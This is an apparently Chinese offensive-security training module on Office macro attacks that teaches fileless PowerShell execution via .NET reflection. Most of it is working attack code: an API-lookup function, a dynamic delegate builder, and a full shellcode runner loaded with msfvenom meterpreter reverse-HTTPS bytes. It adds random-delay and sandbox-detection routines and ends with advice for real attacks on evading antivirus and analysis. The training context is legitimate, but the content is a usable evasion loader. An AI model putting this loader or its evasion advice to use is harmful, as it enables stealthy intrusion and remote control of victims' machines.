# Module 03: Office 宏攻击

## 第六节：反射技术 - 完全内存执行

### 写在前面

如果你是 Web 安全背景，可以这样理解：
- **反射（Reflection）** 类似于 PHP 的 `ReflectionClass`
- 允许在运行时动态获取和调用类、方法
- 可以访问通常无法访问的内部方法
- 是实现"无文件攻击"的关键技术

---

## 一、为什么需要反射？

### 1.1 Add-Type 的问题回顾

上一节我们使用 `Add-Type` 调用 Win32 API，但它有一个严重问题：

```
Add-Type 执行流程：
┌─────────────────────────────────────────────────────────┐
│ 1. PowerShell 将 C# 代码写入临时 .cs 文件              │
│    路径: C:\Users\xxx\AppData\Local\Temp\xxxxx.cs      │
│                                                         │
│ 2. 调用 csc.exe (C# 编译器) 编译                       │
│                                                         │
│ 3. 生成临时 .dll 文件                                  │
│    路径: C:\Users\xxx\AppData\Local\Temp\xxxxx.dll     │
│                                                         │
│ 4. 加载 DLL 到 PowerShell 进程                         │
│                                                         │
│ 5. 删除临时文件                                        │
│                                                         │
│ ⚠️ 问题: 杀软可以在步骤 1-3 检测到恶意代码！           │
└─────────────────────────────────────────────────────────┘
```

### 1.2 反射的优势

使用反射技术，我们可以：
- **完全在内存中操作**，不写入任何文件
- **重用已加载的程序集**，不需要编译新代码
- **访问内部/私有方法**，绕过某些限制

```
反射执行流程：
┌─────────────────────────────────────────────────────────┐
│ 1. 查找已加载的 .NET 程序集                            │
│                                                         │
│ 2. 使用反射获取内部类和方法                            │
│                                                         │
│ 3. 动态调用这些方法                                    │
│                                                         │
│ ✓ 优势: 完全在内存中，无文件落地！                     │
└─────────────────────────────────────────────────────────┘
```

## 二、.NET 反射基础

### 2.1 什么是反射？

反射是 .NET 框架提供的一种机制，允许程序在运行时：
- 获取类型信息
- 创建对象实例
- 调用方法
- 访问字段和属性

### 2.2 关键类和方法

| 类/方法 | 说明 |
|---------|------|
| `AppDomain.CurrentDomain` | 当前应用程序域 |
| `GetAssemblies()` | 获取所有已加载的程序集 |
| `GetType()` | 获取类型信息 |
| `GetMethod()` | 获取方法信息 |
| `GetMethods()` | 获取所有方法 |
| `Invoke()` | 调用方法 |

### 2.3 基础示例

```powershell
# 列出所有已加载的程序集
[AppDomain]::CurrentDomain.GetAssemblies() |
    Select-Object FullName

# 获取特定类型
$type = [System.String]

# 获取类型的所有方法
$type.GetMethods() | Select-Object Name

# 调用静态方法
$method = $type.GetMethod("IsNullOrEmpty")
$method.Invoke($null, @("test"))  # 返回 False
```

## 三、查找可用的 Win32 API

### 3.1 UnsafeNativeMethods 类

.NET 框架内部有一个类 `Microsoft.Win32.UnsafeNativeMethods`，包含了许多已声明的 Win32 API：

```powershell
# 查找包含 "Unsafe" 的类型
$assemblies = [AppDomain]::CurrentDomain.GetAssemblies()

$assemblies | ForEach-Object {
    $_.GetTypes() | ForEach-Object {
        $_ | Get-Member -Static | Where-Object {
            $_.TypeName.Contains('Unsafe')
        }
    } 2>$null
}
```

### 3.2 查找 GetModuleHandle 和 GetProcAddress

这两个 API 是动态查找其他 API 的关键：

```powershell
# 查找 System.dll 中的 UnsafeNativeMethods
$systemDll = [AppDomain]::CurrentDomain.GetAssemblies() |
    Where-Object {
        $_.GlobalAssemblyCache -And
        $_.Location.Split('\\')[-1].Equals('System.dll')
    }

# 获取 UnsafeNativeMethods 类型
$unsafeObj = $systemDll.GetType('Microsoft.Win32.UnsafeNativeMethods')

# 列出所有方法
$unsafeObj.GetMethods() | Select-Object Name
```

输出会包含：
- `GetModuleHandle` - 获取 DLL 基地址
- `GetProcAddress` - 获取函数地址
- 以及其他有用的方法

## 四、动态查找 API 地址

### 4.1 LookupFunc 函数

创建一个通用函数来查找任意 Win32 API 的地址：

```powershell
function LookupFunc {
    Param (
        [Parameter(Position = 0, Mandatory = $True)] [String] $moduleName,
        [Parameter(Position = 1, Mandatory = $True)] [String] $functionName
    )

    # 获取 System.dll 程序集
    $systemDll = ([AppDomain]::CurrentDomain.GetAssemblies() |
        Where-Object {
            $_.GlobalAssemblyCache -And
            $_.Location.Split('\\')[-1].Equals('System.dll')
        }).GetType('Microsoft.Win32.UnsafeNativeMethods')

    # 获取 GetModuleHandle 方法
    $getModuleHandle = $systemDll.GetMethod('GetModuleHandle')

    # 获取 GetProcAddress 方法（可能有多个重载）
    $tmp = @()
    $systemDll.GetMethods() | ForEach-Object {
        If ($_.Name -eq "GetProcAddress") { $tmp += $_ }
    }
    $getProcAddress = $tmp[0]

    # 获取模块句柄
    $moduleHandle = $getModuleHandle.Invoke($null, @($moduleName))

    # 获取函数地址
    $functionAddress = $getProcAddress.Invoke($null, @($moduleHandle, $functionName))

    return $functionAddress
}

# 使用示例
$msgBoxAddr = LookupFunc "user32.dll" "MessageBoxA"
Write-Host "MessageBoxA 地址: $msgBoxAddr"
```

### 4.2 验证地址

```powershell
# 查找 VirtualAlloc 地址
$vaAddr = LookupFunc "kernel32.dll" "VirtualAlloc"
Write-Host "VirtualAlloc 地址: 0x$($vaAddr.ToString('X'))"

# 查找 CreateThread 地址
$ctAddr = LookupFunc "kernel32.dll" "CreateThread"
Write-Host "CreateThread 地址: 0x$($ctAddr.ToString('X'))"
```

## 五、创建委托类型

### 5.1 什么是委托？

委托（Delegate）是 .NET 中的函数指针，定义了函数的签名（参数和返回值类型）。

要调用通过地址找到的函数，我们需要：
1. 创建一个委托类型，定义函数签名
2. 将函数地址转换为委托
3. 调用委托

### 5.2 动态创建委托类型

```powershell
function GetDelegateType {
    Param (
        [Parameter(Position = 0, Mandatory = $True)] [Type[]] $parameters,
        [Parameter(Position = 1)] [Type] $returnType = [Void]
    )

    # 创建动态程序集
    $assemblyName = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
    $domain = [AppDomain]::CurrentDomain
    $assemblyBuilder = $domain.DefineDynamicAssembly(
        $assemblyName,
        [System.Reflection.Emit.AssemblyBuilderAccess]::Run
    )

    # 创建动态模块
    $moduleBuilder = $assemblyBuilder.DefineDynamicModule('InMemoryModule', $false)

    # 创建委托类型
    $typeBuilder = $moduleBuilder.DefineType(
        'MyDelegateType',
        'Class, Public, Sealed, AnsiClass, AutoClass',
        [System.MulticastDelegate]
    )

    # 定义构造函数
    $constructorBuilder = $typeBuilder.DefineConstructor(
        'RTSpecialName, HideBySig, Public',
        [System.Reflection.CallingConventions]::Standard,
        $parameters
    )
    $constructorBuilder.SetImplementationFlags('Runtime, Managed')

    # 定义 Invoke 方法
    $methodBuilder = $typeBuilder.DefineMethod(
        'Invoke',
        'Public, HideBySig, NewSlot, Virtual',
        $returnType,
        $parameters
    )
    $methodBuilder.SetImplementationFlags('Runtime, Managed')

    # 创建类型
    return $typeBuilder.CreateType()
}
```

### 5.3 使用委托调用函数

```powershell
# 示例：调用 MessageBoxA

# 1. 查找函数地址
$msgBoxAddr = LookupFunc "user32.dll" "MessageBoxA"

# 2. 创建委托类型
# MessageBoxA 签名: int MessageBoxA(HWND, LPCSTR, LPCSTR, UINT)
$msgBoxDelegate = GetDelegateType @(
    [IntPtr],   # hWnd
    [String],   # lpText
    [String],   # lpCaption
    [int]       # uType
) ([int])       # 返回值

# 3. 将地址转换为委托
$msgBox = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    $msgBoxAddr,
    $msgBoxDelegate
)

# 4. 调用
$msgBox.Invoke([IntPtr]::Zero, "Hello from Reflection!", "Test", 0)
```

## 六、完整的反射 Shellcode 执行器

### 6.1 完整代码

```powershell
# ============================================
# 反射 Shellcode 执行器
# 完全在内存中执行，无文件落地
# ============================================

# 函数：查找 API 地址
function LookupFunc {
    Param ($moduleName, $functionName)

    $systemDll = ([AppDomain]::CurrentDomain.GetAssemblies() |
        Where-Object {
            $_.GlobalAssemblyCache -And
            $_.Location.Split('\\')[-1].Equals('System.dll')
        }).GetType('Microsoft.Win32.UnsafeNativeMethods')

    $tmp = @()
    $systemDll.GetMethods() | ForEach-Object {
        If ($_.Name -eq "GetProcAddress") { $tmp += $_ }
    }

    return $tmp[0].Invoke($null, @(
        ($systemDll.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)),
        $functionName
    ))
}

# 函数：创建委托类型
function GetDelegateType {
    Param (
        [Parameter(Position = 0, Mandatory = $True)] [Type[]] $parameters,
        [Parameter(Position = 1)] [Type] $returnType = [Void]
    )

    $assemblyName = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
    $assemblyBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly(
        $assemblyName,
        [System.Reflection.Emit.AssemblyBuilderAccess]::Run
    )
    $moduleBuilder = $assemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
    $typeBuilder = $moduleBuilder.DefineType(
        'MyDelegateType',
        'Class, Public, Sealed, AnsiClass, AutoClass',
        [System.MulticastDelegate]
    )

    $constructorBuilder = $typeBuilder.DefineConstructor(
        'RTSpecialName, HideBySig, Public',
        [System.Reflection.CallingConventions]::Standard,
        $parameters
    )
    $constructorBuilder.SetImplementationFlags('Runtime, Managed')

    $methodBuilder = $typeBuilder.DefineMethod(
        'Invoke',
        'Public, HideBySig, NewSlot, Virtual',
        $returnType,
        $parameters
    )
    $methodBuilder.SetImplementationFlags('Runtime, Managed')

    return $typeBuilder.CreateType()
}

# ========== 主程序 ==========

# Shellcode (msfvenom -p windows/meterpreter/reverse_https LHOST=IP LPORT=443 EXITFUNC=thread -f ps1)
[Byte[]] $buf = 0xfc,0xe8,0x82,0x0,0x0,0x0,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,
0x8b,0x52,0xc,0x8b,0x52,0x14,0x8b,0x72,0x28,0xf,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61
# ... 更多字节 ...

$size = $buf.Length

# 查找 VirtualAlloc
$vaAddr = LookupFunc "kernel32.dll" "VirtualAlloc"
$vaDelegate = GetDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])
$VirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($vaAddr, $vaDelegate)

# 查找 CreateThread
$ctAddr = LookupFunc "kernel32.dll" "CreateThread"
$ctDelegate = GetDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
$CreateThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ctAddr, $ctDelegate)

# 查找 WaitForSingleObject
$wfsoAddr = LookupFunc "kernel32.dll" "WaitForSingleObject"
$wfsoDelegate = GetDelegateType @([IntPtr], [Int32]) ([Int32])
$WaitForSingleObject = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($wfsoAddr, $wfsoDelegate)

# 分配内存
$addr = $VirtualAlloc.Invoke([IntPtr]::Zero, $size, 0x3000, 0x40)

# 复制 Shellcode
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $size)

# 创建线程
$thandle = $CreateThread.Invoke([IntPtr]::Zero, 0, $addr, [IntPtr]::Zero, 0, [IntPtr]::Zero)

# 等待线程
$WaitForSingleObject.Invoke($thandle, 0xFFFFFFFF)
```

### 6.2 代码流程图

```
┌─────────────────────────────────────────────────────────────┐
│                    反射 Shellcode 执行流程                   │
└─────────────────────────────────────────────────────────────┘

1. 定义辅助函数
   ├── LookupFunc: 查找 API 地址
   └── GetDelegateType: 创建委托类型
         │
         ▼
2. 查找 VirtualAlloc 地址
   ┌─────────────────────────────────────┐
   │  LookupFunc "kernel32.dll" "VirtualAlloc"  │
   │  → 返回函数地址 (如 0x7FFE1234)    │
   └─────────────────────────────────────┘
         │
         ▼
3. 创建 VirtualAlloc 委托
   ┌─────────────────────────────────────┐
   │  GetDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])  │
   │  → 返回委托类型                    │
   │                                     │
   │  GetDelegateForFunctionPointer      │
   │  → 将地址转换为可调用的委托        │
   └─────────────────────────────────────┘
         │
         ▼
4. 同样处理 CreateThread 和 WaitForSingleObject
         │
         ▼
5. 调用 VirtualAlloc 分配内存
   ┌─────────────────────────────────────┐
   │  $VirtualAlloc.Invoke(0, $size, 0x3000, 0x40)  │
   │  → 返回内存地址                    │
   └─────────────────────────────────────┘
         │
         ▼
6. 复制 Shellcode 到内存
   ┌─────────────────────────────────────┐
   │  [Marshal]::Copy($buf, 0, $addr, $size)  │
   └─────────────────────────────────────┘
         │
         ▼
7. 创建线程执行
   ┌─────────────────────────────────────┐
   │  $CreateThread.Invoke(...)          │
   │  $WaitForSingleObject.Invoke(...)   │
   └─────────────────────────────────────┘
         │
         ▼
8. Shellcode 执行，建立连接
```

## 七、对比：Add-Type vs 反射

| 特性 | Add-Type | 反射 |
|------|----------|------|
| 文件落地 | 是（临时 .cs 和 .dll） | 否 |
| 代码复杂度 | 低 | 高 |
| 执行速度 | 较慢（需要编译） | 较快 |
| 检测难度 | 较容易 | 较难 |
| 灵活性 | 中等 | 高 |
| 适用场景 | 开发测试 | 实战攻击 |

### 8.2 延迟执行

```powershell
# 随机延迟
Start-Sleep -Seconds (Get-Random -Minimum 5 -Maximum 15)

$sleepAddr = LookupFunc "kernel32.dll" "Sleep"
$sleepDelegate = GetDelegateType @([UInt32])
$Sleep = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($sleepAddr, $sleepDelegate)

```

### 8.3 环境检测

```powershell
# 检测是否在沙箱中
function Test-Sandbox {
    # 检查进程数量
    if ((Get-Process).Count -lt 30) { return $true }

    # 检查最近文件
    if ((Get-ChildItem "$env:APPDATA\Microsoft\Windows\Recent" -ErrorAction SilentlyContinue).Count -lt 5) { return $true }

    # 检查域环境
    if ($env:USERDOMAIN -eq $env:COMPUTERNAME) { return $true }

    return $false
}

if (Test-Sandbox) {
    Write-Host "Normal execution..."
    exit
}
```

## 十、总结

### 10.1 关键点

1. **反射允许访问内部方法**：可以使用 .NET 框架中已有的 Win32 API 声明
2. **完全内存执行**：不需要写入任何文件
3. **动态委托**：可以在运行时创建函数签名
4. **更难检测**：没有明显的 Add-Type 特征

### 10.2 实战建议

1. 在实际攻击中优先使用反射技术
2. 结合混淆和延迟执行
3. 添加环境检测避免沙箱分析
4. 定期更新代码避免签名检测
